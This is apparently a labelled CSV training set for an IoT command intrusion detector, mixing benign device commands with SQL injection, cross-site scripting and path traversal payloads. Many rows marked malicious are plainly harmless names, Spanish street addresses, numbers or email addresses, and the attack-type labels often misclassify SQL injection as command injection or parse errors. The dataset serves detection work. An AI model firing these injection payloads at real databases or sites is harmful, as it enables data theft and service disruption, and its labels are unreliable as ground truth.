payload,label,attack_type
6368525574749403,malicious,cmd_parse_error
garv,malicious,cmd_parse_error
hinojo,malicious,cmd_parse_error
"-9587 union all select 1568,1568,1568,1568,1568,1568#",malicious,cmd_parse_error
-4901) or 3407=6442#,malicious,cmd_parse_error
calle teniente bragado 139 7?e,malicious,cmd_parse_error
"1 where 3478=3478 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",malicious,cmdi
"echo, ['safe']",benign,norm
moll@eurograb.ic,malicious,cmd_parse_error
1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb,malicious,cmd_parse_error
macreyno,malicious,cmd_parse_error
adelfa,malicious,cmd_parse_error
paucides,malicious,cmd_parse_error
"run_cmd, ADD 716 647",benign,norm
calzada rebassa,malicious,cmd_parse_error
"run_cmd, ADD 515 225",benign,norm
"-3116)) as jyiq where 3875=3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",malicious,cmd_parse_error
"run_cmd, ADD 631 273",benign,norm
"echo, ['status', 'normal', 'data']",benign,norm
"run_cmd, echo ['ping']",benign,norm
"-6377'||(select 'ryin' where 2113=2113 union all select 2113,2113,2113#",malicious,cmdi
"1' or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
22232,malicious,cmd_parse_error
"run_cmd, echo ['data']",benign,norm
1' where 9708=9708 or sleep(5)--,malicious,cmd_parse_error
abell lamarca,malicious,cmd_parse_error
"run_cmd, ADD 568 586",benign,norm
"run_cmd, ADD 537 440",benign,norm
8158777429783500,malicious,cmd_parse_error
"run_cmd, ADD 962 802",benign,norm
diminucin,malicious,cmd_parse_error
tarasewi,malicious,cmd_parse_error
salgueiro 188,malicious,cmd_parse_error
"run_cmd, echo ['ok']",benign,norm
atufamiento,malicious,cmd_parse_error
"start_temp_report, 90",benign,norm
swaden,malicious,cmd_parse_error
"echo, ['report', 'status', 'sensor', 'iot']",benign,norm
"run_cmd, echo ['payload', 'ok']",benign,norm
empa.etar,malicious,cmd_parse_error
28413,malicious,cmd_parse_error
"run_cmd, echo ['world', 'report', 'ready', 'status']",benign,norm
"start_temp_report, 76",benign,norm
crabe,malicious,cmd_parse_error
"start_temp_report, 75",benign,norm
"run_cmd, ADD 794 234",benign,norm
zeng,malicious,cmd_parse_error
"run_cmd, ADD 738 140",benign,norm
"echo, ['ok', 'normal', 'safe', 'payload']",benign,norm
-3422%') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',malicious,cmdi
"run_cmd, echo ['ready']",benign,norm
"run_cmd, echo ['iot', 'safe']",benign,norm
general ricardos 187,malicious,cmd_parse_error
"run_cmd, ADD 626 157",benign,norm
"c/ galicia, 180,",malicious,cmd_parse_error
"run_cmd, ADD 924 802",benign,norm
basta,malicious,cmd_parse_error
"run_cmd, echo ['ping']",benign,norm
"run_cmd, echo ['payload', 'mqtt']",benign,norm
"echo, ['payload', 'sensor']",benign,norm
"run_cmd, echo ['world', 'data']",benign,norm
"start_temp_report, 70",benign,norm
"start_temp_report, 99",benign,norm
">""<body onload=""document.cookie=true;"">",malicious,cmdi
"echo, ['safe', 'data', 'payload', 'normal']",benign,norm
"run_cmd, echo ['data', 'report']",benign,norm
"start_temp_report, 89",benign,norm
"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">",malicious,cmdi
"run_cmd, echo ['iot', 'safe', 'status', 'ok']",benign,norm
"1'||(select 'ymwf' where 1229=1229 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",malicious,cmdi
"echo, ['ok']",benign,norm
septimio,malicious,cmd_parse_error
"run_cmd, ADD 958 386",benign,norm
"run_cmd, ADD 112 43",benign,norm
"run_cmd, echo ['payload', 'esp32']",benign,norm
"run_cmd, ADD 989 104",benign,norm
"start_temp_report, 55",benign,norm
"start_temp_report, 41",benign,norm
"echo, ['ready', 'normal', 'world']",benign,norm
1%'))) and 2444=9282#,malicious,cmd_parse_error
"run_cmd, ADD 169 665",benign,norm
"c/ obispo alonso suarez, 163,",malicious,cmd_parse_error
cerratn de juarros,malicious,cmd_parse_error
"start_temp_report, 12",benign,norm
"run_cmd, echo ['ok', 'device', 'esp32', 'payload']",benign,norm
50316,malicious,cmd_parse_error
83178933p,malicious,cmd_parse_error
-2210' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and 'myvr' like 'myvr,malicious,cmdi
"echo, ['hello', 'report', 'status']",benign,norm
"run_cmd, ADD 463 995",benign,norm
2787973107257855,malicious,cmd_parse_error
entresurco,malicious,cmd_parse_error
gili-malave@bierstuetze.ac,malicious,cmd_parse_error
"run_cmd, ADD 290 207",benign,norm
"run_cmd, echo ['esp32', 'data', 'ok', 'ready']",benign,norm
space3,malicious,cmd_parse_error
demostrar,malicious,cmd_parse_error
"1%"")) union all select null,null,null,null,null,null,null#",malicious,cmd_parse_error
3992,malicious,cmd_parse_error
"-1710"")) as cvky where 1858=1858 union all select 1858,1858--",malicious,cmd_parse_error
/................................................................................................................................................................{file},malicious,cmd_parse_error
75512816k,malicious,cmd_parse_error
"1'+(select qmez where 3729=3729 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
"run_cmd, echo ['system', 'status', 'normal']",benign,norm
1%'))) rlike (select * from (select(sleep(5)))sgvo) and ((('%'=',malicious,cmd_parse_error
"1%')) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmd_parse_error
"run_cmd, ADD 339 349",benign,norm
"start_temp_report, 7",benign,norm
"echo, ['data', 'status', 'ready']",benign,norm
janet,malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'payload', 'ping', 'normal']",benign,norm
5907,malicious,cmd_parse_error
4014,malicious,cmd_parse_error
"run_cmd, ADD 146 516",benign,norm
calle juan agui 97 9-e,malicious,cmd_parse_error
"start_temp_report, 83",benign,norm
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",malicious,cmd_parse_error
alconchel,malicious,cmd_parse_error
crista,malicious,cmd_parse_error
"run_cmd, ADD 669 581",benign,norm
"echo, ['payload', 'data']",benign,norm
"<table background=""javascript:document.cookie=true;"">",malicious,cmdi
"1)) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
"run_cmd, echo ['sensor']",benign,norm
pladeval berganciano,malicious,cmd_parse_error
4279654044611256,malicious,cmd_parse_error
"1'))) or elt(5873=5873,sleep(5))#",malicious,cmd_parse_error
"start_temp_report, 62",benign,norm
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",malicious,cmd_parse_error
tuneu,malicious,cmd_parse_error
"start_temp_report, 18",benign,norm
"start_temp_report, 103",benign,norm
29574909z,malicious,cmd_parse_error
"<div style=""background-image: url(javascript:alert('xss'));"">",malicious,cmdi
"echo, ['world']",benign,norm
8084984128679341,malicious,cmd_parse_error
heintje0@alpesfranceses.com.ro,malicious,cmd_parse_error
chaucon caban,malicious,cmd_parse_error
"1"")) as fjtv where 8904=8904;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,cmdi
"start_temp_report, 58",benign,norm
3354081674154882,malicious,cmd_parse_error
"start_temp_report, 61",benign,norm
riegger.zaleska@cirujanaplastica.cn,malicious,cmd_parse_error
"-7686%"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,cmd_parse_error
"echo, ['mqtt']",benign,norm
erda5,malicious,cmd_parse_error
"pelayo, 11 12?d",malicious,cmd_parse_error
"run_cmd, ADD 797 890",benign,norm
"echo, ['system', 'world', 'mqtt', 'normal']",benign,norm
....web-inf/web.xml,malicious,cmd_parse_error
vidrioso,malicious,cmd_parse_error
"plza. mirto, 135",malicious,cmd_parse_error
"run_cmd, echo ['hello', 'data', 'ok', 'safe']",benign,norm
pierpoint@youtubed.sh,malicious,cmd_parse_error
"run_cmd, echo ['device', 'world', 'safe', 'sensor']",benign,norm
"start_temp_report, 72",benign,norm
"c/ universidad laboral 193,",malicious,cmd_parse_error
"start_temp_report, 75",benign,norm
arceo feliu,malicious,cmd_parse_error
"echo, ['esp32', 'safe', 'device']",benign,norm
a3o1erada,malicious,cmd_parse_error
"run_cmd, ADD 790 725",benign,norm
r09pe574,malicious,cmd_parse_error
"echo, ['data', 'sensor', 'ready', 'report']",benign,norm
"echo, ['ok']",benign,norm
"run_cmd, ADD 431 106",benign,norm
5x8r0r,malicious,cmd_parse_error
"1')) as egsj where 3447=3447;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,cmdi
"1%"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""%""=""",malicious,cmd_parse_error
///{file},malicious,cmd_parse_error
"run_cmd, ADD 519 455",benign,norm
"run_cmd, ADD 38 724",benign,norm
"c/ barri del polvori, 77",malicious,cmd_parse_error
"1%"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",malicious,cmd_parse_error
cortes de la frontera,malicious,cmd_parse_error
"run_cmd, echo ['payload']",benign,norm
"run_cmd, echo ['data']",benign,norm
"start_temp_report, 22",benign,norm
"start_temp_report, 31",benign,norm
"echo, ['normal', 'sensor', 'hello', 'ok']",benign,norm
"start_temp_report, 78",benign,norm
84881293t,malicious,cmd_parse_error
0a1q45tu9rt8,malicious,cmd_parse_error
1'+(select smze where 5616=5616;select (case when (7978=6009) then 7978 else 1/(select 0) end)--,malicious,cmdi
26033,malicious,cmd_parse_error
"run_cmd, ADD 573 942",benign,norm
"1)(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (4003=4003",malicious,cmdi
"run_cmd, echo ['safe', 'device', 'esp32', 'world']",benign,norm
"1'+(select 'dbvq' where 2045=2045 or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,cmd_parse_error
"-5667%')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='",malicious,cmdi
"run_cmd, ADD 978 838",benign,norm
"echo, ['normal']",benign,norm
"run_cmd, echo ['esp32', 'ready', 'ok']",benign,norm
15423399j,malicious,cmd_parse_error
"1""))) or elt(6272=6272,sleep(5)) and (((""jref"" like ""jref",malicious,cmd_parse_error
"echo, ['world', 'ping', 'sensor', 'ready']",benign,norm
"1%""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""%""=""",malicious,cmd_parse_error
"run_cmd, ADD 445 947",benign,norm
"echo, ['status']",benign,norm
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",malicious,cmdi
"start_temp_report, 73",benign,norm
1' in boolean mode) and 9198=9198--,malicious,cmd_parse_error
"run_cmd, ADD 956 669",benign,norm
mora de rubielos,malicious,cmd_parse_error
"run_cmd, ADD 300 528",benign,norm
"start_temp_report, 61",benign,norm
"run_cmd, echo ['safe', 'ok']",benign,norm
"start_temp_report, 56",benign,norm
"echo, ['ok', 'data', 'ping', 'mqtt']",benign,norm
"-1763%"" or (8459=8459)*4906 and ""%""=""",malicious,cmd_parse_error
"echo, ['world', 'ok']",benign,norm
"run_cmd, ADD 571 736",benign,norm
nervino,malicious,cmd_parse_error
"run_cmd, ADD 217 213",benign,norm
ellery,malicious,cmd_parse_error
"1'+(select 'sqje' where 1634=1634 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))+'",malicious,cmd_parse_error
buciegas,malicious,cmd_parse_error
"run_cmd, ADD 835 37",benign,norm
"echo, ['iot']",benign,norm
"run_cmd, echo ['system', 'iot', 'world', 'ready']",benign,norm
-5229')) as tkqp where 9253=9253 or 9323=9323#,malicious,cmd_parse_error
"1%"")));select benchmark(5000000,md5(0x714e4153))#",malicious,cmdi
"run_cmd, echo ['ready', 'device', 'ok', 'esp32']",benign,norm
"echo, ['status', 'data', 'system']",benign,norm
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""ilrk""=""ilrk",malicious,cmdi
adepto,malicious,cmd_parse_error
"echo, ['device', 'safe']",benign,norm
"run_cmd, ADD 235 215",benign,norm
"echo, ['device', 'ready', 'payload', 'iot']",benign,norm
"run_cmd, ADD 834 554",benign,norm
1';waitfor delay '0:0:5',malicious,cmdi
4ode5ista,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'system', 'data', 'esp32']",benign,norm
14139,malicious,cmd_parse_error
"run_cmd, ADD 261 53",benign,norm
"1"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""rvub"" like ""rvub",malicious,cmdi
"run_cmd, echo ['normal', 'payload', 'safe']",benign,norm
chalanera,malicious,cmd_parse_error
carlie,malicious,cmd_parse_error
"run_cmd, echo ['system', 'safe', 'payload', 'device']",benign,norm
aflechate,malicious,cmd_parse_error
"run_cmd, echo ['world', 'normal', 'ok']",benign,norm
"start_temp_report, 69",benign,norm
"start_temp_report, 83",benign,norm
"start_temp_report, 55",benign,norm
"run_cmd, ADD 756 279",benign,norm
"start_temp_report, 89",benign,norm
"1'+(select vlut where 9517=9517 union all select null,null,null--",malicious,cmd_parse_error
"1%""))) union all select null,null,null,null,null,null#",malicious,cmd_parse_error
1) where 3565=3565 and 6969=(select 6969 from pg_sleep(5))--,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'payload', 'hello', 'safe']",benign,norm
novallas,malicious,cmd_parse_error
-7624') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('iwab'='iwab,malicious,cmdi
meinrad,malicious,cmd_parse_error
"start_temp_report, 80",benign,norm
"echo, ['world']",benign,norm
"run_cmd, echo ['data', 'normal', 'sensor', 'ready']",benign,norm
"churruca 155,",malicious,cmd_parse_error
"run_cmd, ADD 923 29",benign,norm
"run_cmd, echo ['mqtt']",benign,norm
"run_cmd, echo ['esp32']",benign,norm
"run_cmd, ADD 816 633",benign,norm
"run_cmd, ADD 785 785",benign,norm
"start_temp_report, 59",benign,norm
"run_cmd, echo ['device']",benign,norm
"echo, ['ping', 'mqtt', 'status', 'normal']",benign,norm
"echo, ['normal', 'esp32', 'safe']",benign,norm
"run_cmd, echo ['ping']",benign,norm
besch@qcole.bt,malicious,cmd_parse_error
"run_cmd, ADD 466 15",benign,norm
romanones,malicious,cmd_parse_error
"echo, ['iot', 'sensor', 'ok', 'ready']",benign,norm
1');waitfor delay '0:0:5' and ('gpqx' like 'gpqx,malicious,cmdi
46700,malicious,cmd_parse_error
"1"" and 4595=4595#",malicious,cmd_parse_error
2190197985147035,malicious,cmd_parse_error
"echo, ['ping', 'sensor', 'ready', 'device']",benign,norm
pablo de la cruz,malicious,cmd_parse_error
6264,malicious,cmd_parse_error
7840792716096931,malicious,cmd_parse_error
iara,malicious,cmd_parse_error
"start_temp_report, 12",benign,norm
"-7580')) as mmqt where 3468=3468 union all select 3468,3468,3468,3468,3468,3468#",malicious,cmd_parse_error
"echo, ['safe', 'ok', 'payload']",benign,norm
"run_cmd, ADD 14 781",benign,norm
"1"")));select * from generate_series(9058,9058,case when (9058=1183) then 1 else 0 end) limit 1--",malicious,cmdi
3581640568970302,malicious,cmd_parse_error
1) where 8041=8041;select (case when (5970=2200) then 1 else 5970*(select 5970 from master..sysdatabases) end)--,malicious,cmdi
"run_cmd, ADD 752 636",benign,norm
36384,malicious,cmd_parse_error
"run_cmd, echo ['report', 'system', 'data']",benign,norm
"echo, ['report', 'normal', 'system', 'safe']",benign,norm
"run_cmd, echo ['status', 'ok', 'mqtt']",benign,norm
neisy,malicious,cmd_parse_error
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('dhwt'='dhwt",malicious,cmd_parse_error
"echo, ['hello', 'payload', 'ping']",benign,norm
"run_cmd, echo ['data', 'ok', 'hello', 'esp32']",benign,norm
"run_cmd, ADD 228 434",benign,norm
bohlen_newtell@lodgemadrid.it,malicious,cmd_parse_error
"run_cmd, echo ['hello', 'world', 'mqtt', 'report']",benign,norm
"-6520%"") order by 1#",malicious,cmd_parse_error
"echo, ['ok', 'data']",benign,norm
"start_temp_report, 90",benign,norm
giuliana,malicious,cmd_parse_error
"1%'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='",malicious,cmd_parse_error
"run_cmd, ADD 299 570",benign,norm
"1"") as vcir where 6275=6275 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",malicious,cmdi
grevelin,malicious,cmd_parse_error
laicismo,malicious,cmd_parse_error
"1"";begin dbms_lock.sleep(5); end and ""xlvn""=""xlvn",malicious,cmdi
"run_cmd, echo ['safe', 'payload', 'iot', 'status']",benign,norm
70304292p,malicious,cmd_parse_error
"start_temp_report, 75",benign,norm
andosilla,malicious,cmd_parse_error
1'+(select trte where 9173=9173 and 2006=2006,malicious,cmd_parse_error
1'+(select 'rkap' where 9692=9692;waitfor delay '0:0:5')+',malicious,cmdi
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),malicious,cmdi
flaviano,malicious,cmd_parse_error
7225214328670824,malicious,cmd_parse_error
"-9577'||(select 'vloa' from dual where 7184=7184 union all select 7184,7184#",malicious,cmdi
"run_cmd, echo ['world', 'system']",benign,norm
"1"");select (case when (1868=5071) then 1 else 1868*(select 1868 from master..sysdatabases) end)--",malicious,cmdi
37,malicious,cmd_parse_error
"start_temp_report, 117",benign,norm
<script>document.cookie=true;//--></script>,malicious,xss
2876,malicious,cmd_parse_error
"1' in boolean mode) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)#",malicious,cmd_parse_error
"start_temp_report, 34",benign,norm
clorosis,malicious,cmd_parse_error
-3752%' union all select 9351--,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'ping', 'ok', 'hello']",benign,norm
"run_cmd, echo ['ok', 'status']",benign,norm
"run_cmd, ADD 396 646",benign,norm
1' or sleep(5) and 'udqz'='udqz,malicious,cmd_parse_error
"echo, ['ready', 'safe', 'system', 'device']",benign,norm
32,malicious,cmd_parse_error
"run_cmd, echo ['safe', 'system', 'ok']",benign,norm
"start_temp_report, 6",benign,norm
"echo, ['esp32', 'mqtt', 'ping']",benign,norm
"start_temp_report, 6",benign,norm
"-1<frameset><frame src=""javascript:document.cookie=true;""></frameset>",malicious,cmdi
"1'+(select 'ycsv' where 3628=3628 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
peimel,malicious,cmd_parse_error
gdor,malicious,cmd_parse_error
"calahorra, la",malicious,cmd_parse_error
"start_temp_report, 91",benign,norm
3303,malicious,cmd_parse_error
santa colomba de somoza,malicious,cmd_parse_error
"run_cmd, ADD 135 741",benign,norm
"-9891"" union all select 7489#",malicious,cmd_parse_error
"dos aceras 119,",malicious,cmd_parse_error
"run_cmd, ADD 171 207",benign,norm
-4498) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2902=2902,malicious,cmdi
-2505' or 9323=9323#,malicious,cmd_parse_error
"echo, ['world', 'sensor', 'normal', 'status']",benign,norm
"1"")) as eglv where 7412=7412 union all select null#",malicious,cmd_parse_error
05301323f,malicious,cmd_parse_error
-1890'))) or 8526=1389 and ((('ecgt'='ecgt,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'ok']",benign,norm
ashlin,malicious,cmd_parse_error
"echo, ['hello', 'status', 'mqtt', 'esp32']",benign,norm
"1"")) as qode where 2398=2398 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",malicious,cmd_parse_error
"start_temp_report, 105",benign,norm
"start_temp_report, 90",benign,norm
1) where 1402=1402;select sleep(5)#,malicious,cmdi
reynna,malicious,cmd_parse_error
"1%')) union all select null,null,null,null,null,null,null,null#",malicious,cmd_parse_error
"1""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,cmdi
env+olvente,malicious,cmd_parse_error
"run_cmd, ADD 459 182",benign,norm
"start_temp_report, 68",benign,norm
granera,malicious,cmd_parse_error
"run_cmd, ADD 168 229",benign,norm
"echo, ['normal', 'data']",benign,norm
milligan,malicious,cmd_parse_error
"echo, ['mqtt', 'iot']",benign,norm
"start_temp_report, 19",benign,norm
3499,malicious,cmd_parse_error
"run_cmd, ADD 584 170",benign,norm
"run_cmd, ADD 7 262",benign,norm
8271,malicious,cmd_parse_error
"echo, ['iot', 'ready']",benign,norm
"start_temp_report, 51",benign,norm
"echo, ['system', 'device', 'payload', 'mqtt']",benign,norm
4189,malicious,cmd_parse_error
"echo, ['data', 'payload']",benign,norm
"1))) and 8407=(select count(*) from generate_series(1,5000000)) and (((1729=1729",malicious,cmd_parse_error
"run_cmd, echo ['mqtt']",benign,norm
"run_cmd, echo ['status']",benign,norm
"start_temp_report, 41",benign,norm
-9217 or 9323=9323#,malicious,cmd_parse_error
7730856749924883,malicious,cmd_parse_error
86015906t,malicious,cmd_parse_error
"start_temp_report, 32",benign,norm
vazkn,malicious,cmd_parse_error
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,cmdi
homan,malicious,cmd_parse_error
brind.am,malicious,cmd_parse_error
"echo, ['esp32', 'ready', 'hello']",benign,norm
"el provencio, 6 8f",malicious,cmd_parse_error
aubine,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'report', 'ok', 'ready']",benign,norm
1') where 9817=9817;begin user_lock.sleep(5); end--,malicious,cmdi
<b <script>alert(1)//</script>0</script></b>,malicious,xss
"run_cmd, echo ['data', 'mqtt', 'esp32', 'ping']",benign,norm
calle rosa de los vientos 166 9?a,malicious,cmd_parse_error
"start_temp_report, 8",benign,norm
"run_cmd, ADD 47 381",benign,norm
leo,malicious,cmd_parse_error
6721,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'normal']",benign,norm
estate,malicious,cmd_parse_error
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),malicious,cmdi
"echo, ['normal', 'safe']",benign,norm
zool7ic1,malicious,cmd_parse_error
"1' where 3700=3700 union all select null,null,null--",malicious,cmd_parse_error
"c/ cangrexeiras, 164, 4e",malicious,cmd_parse_error
1 where 4153=4153 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,malicious,cmd_parse_error
di874i0,malicious,cmd_parse_error
"run_cmd, echo ['mqtt']",benign,norm
8328,malicious,cmd_parse_error
gabina,malicious,cmd_parse_error
calle mont-ral 59 12?g,malicious,cmd_parse_error
"1%""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",malicious,cmd_parse_error
"start_temp_report, 79",benign,norm
"run_cmd, ADD 319 894",benign,norm
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,cmdi
"run_cmd, echo ['safe', 'hello', 'payload', 'ok']",benign,norm
cabeza novella,malicious,cmd_parse_error
"-5225')) as zats where 5629=5629 union all select 5629,5629,5629,5629,5629--",malicious,cmd_parse_error
"run_cmd, echo ['normal']",benign,norm
"-4394')) union all select 3409,3409--",malicious,cmd_parse_error
"run_cmd, ADD 984 599",benign,norm
"echo, ['mqtt', 'sensor', 'safe']",benign,norm
villalpando iturbide,malicious,cmd_parse_error
"run_cmd, echo ['report', 'safe']",benign,norm
"echo, ['ping', 'data', 'normal', 'esp32']",benign,norm
"run_cmd, echo ['system']",benign,norm
"-8256""))) or 6872=6872 and (((""lrtu""=""lrtu",malicious,cmd_parse_error
"run_cmd, ADD 0 442",benign,norm
su0r6s09,malicious,cmd_parse_error
"start_temp_report, 41",benign,norm
"run_cmd, ADD 506 829",benign,norm
limpi$aas,malicious,cmdi
"echo, ['sensor', 'normal']",benign,norm
"run_cmd, echo ['safe', 'hello', 'world', 'ready']",benign,norm
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('gxpr'='gxpr",malicious,cmd_parse_error
"1%"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""%""=""",malicious,cmd_parse_error
"start_temp_report, 16",benign,norm
"run_cmd, ADD 980 185",benign,norm
stanczak-kasem@movil-google.tj,malicious,cmd_parse_error
"echo, ['normal', 'sensor', 'status', 'report']",benign,norm
"run_cmd, ADD 171 953",benign,norm
"run_cmd, echo ['payload', 'report', 'system', 'world']",benign,norm
-8410'))) or 8571=8571--,malicious,cmd_parse_error
nien-hwa,malicious,cmd_parse_error
"fonsagrada, a",malicious,cmd_parse_error
"start_temp_report, 90",benign,norm
"echo, ['data', 'mqtt']",benign,norm
"echo, ['status']",benign,norm
"echo, ['device', 'status', 'report']",benign,norm
9270844246904218,malicious,cmd_parse_error
"echo, ['normal', 'device']",benign,norm
"1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""smhd"" like ""smhd",malicious,cmd_parse_error
"c/ amador de los rios, 131, 1?g",malicious,cmd_parse_error
9173442177715818,malicious,cmd_parse_error
"start_temp_report, 4",benign,norm
"start_temp_report, 26",benign,norm
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('ywxe' like 'ywxe",malicious,cmd_parse_error
"start_temp_report, 34",benign,norm
"echo, ['esp32', 'system']",benign,norm
ugartechea oviol,malicious,cmd_parse_error
"1%"");select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",malicious,cmdi
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('nfix'='nfix,malicious,cmdi
"run_cmd, ADD 203 989",benign,norm
48394,malicious,cmd_parse_error
"start_temp_report, 118",benign,norm
"-4964"")) union all select 4750,4750,4750,4750,4750--",malicious,cmd_parse_error
"echo, ['iot', 'esp32', 'device', 'ok']",benign,norm
"start_temp_report, 31",benign,norm
"run_cmd, ADD 219 926",benign,norm
